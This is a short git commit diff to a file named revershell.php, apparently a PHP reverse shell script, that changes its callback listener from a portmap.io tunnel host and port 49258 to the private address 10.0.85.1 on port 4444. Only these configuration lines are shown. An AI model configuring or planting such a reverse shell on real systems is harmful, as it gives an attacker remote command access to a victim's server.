c0ce3c7a2802a0de7d1fb190872a75aaec7738d0
Z4N3001 <zane96420@gmail.com>
2025-06-08 11:38:39 +0630

    Update revershell.php

--- revershell.php
+++ revershell.php
@@ -47,8 +47,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = 'tcp://NyiMInHtet-49258.portmap.io';  // CHANGE THIS
-$port = 49258;       // CHANGE THIS
+$ip = '10.0.85.1';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
